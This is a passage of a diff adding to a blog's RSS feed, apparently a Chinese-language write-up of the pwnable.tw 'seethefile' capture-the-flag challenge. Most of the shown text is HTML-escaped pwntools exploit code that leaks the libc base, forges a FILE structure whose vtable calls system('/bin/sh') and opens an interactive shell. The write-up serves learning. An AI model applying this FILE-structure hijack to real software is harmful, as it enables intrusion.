+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endswith&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'.so'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'-'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;pause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+
+&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Found libc base &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Address of system &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'system'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
+
+&lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;                                       &lt;span class=&quot;c1&quot;&gt;# file
+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xFFFFDFFF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;                         &lt;span class=&quot;c1&quot;&gt;# file-&amp;gt;_flags  set _IO_IS_FILEBUF bit to false
+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;;/bin/sh;&quot;&lt;/span&gt;                             &lt;span class=&quot;c1&quot;&gt;# file-&amp;gt;???     to be interpreted as a string
+&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ljust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'A'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;                   &lt;span class=&quot;c1&quot;&gt;# padding to reach *fp
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'name'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;             &lt;span class=&quot;c1&quot;&gt;# *fp           overwrite *fp to point to the start of the name buffer
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'`'&lt;/span&gt;                                  &lt;span class=&quot;c1&quot;&gt;# padding
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'A'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;72&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;37&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;                        &lt;span class=&quot;c1&quot;&gt;# padding
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'filename'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;# file-&amp;gt;_lock   vtable-&amp;gt;__dummy
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'name'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;72&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;        &lt;span class=&quot;c1&quot;&gt;# file-&amp;gt;vtable  vtable-&amp;gt;__dummy2
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'system'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;          &lt;span class=&quot;c1&quot;&gt;#               vtable-&amp;gt;__finish
+&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;get shell之后还要到/home/seethefile下面，给了一个get_flag.c和编译好的可执行文件，通过这个文件才可以把flag读取出来，应该是为了防止非预期解，把权限管理的比较严格。&lt;/p&gt;
+
+</description>
+        <pubDate>Wed, 23 Feb 2022 00:00:00 +0800</pubDate>
+        <link>http://localhost:8000//pwnable-tw-seethefile</link>
+        <link href="http://localhost:8000/pwnable-tw-seethefile"/>
+        <guid isPermaLink="true">http://localhost:8000/pwnable-tw-seethefile</guid>
+      </item>
+    
+  </channel>
+</rss>
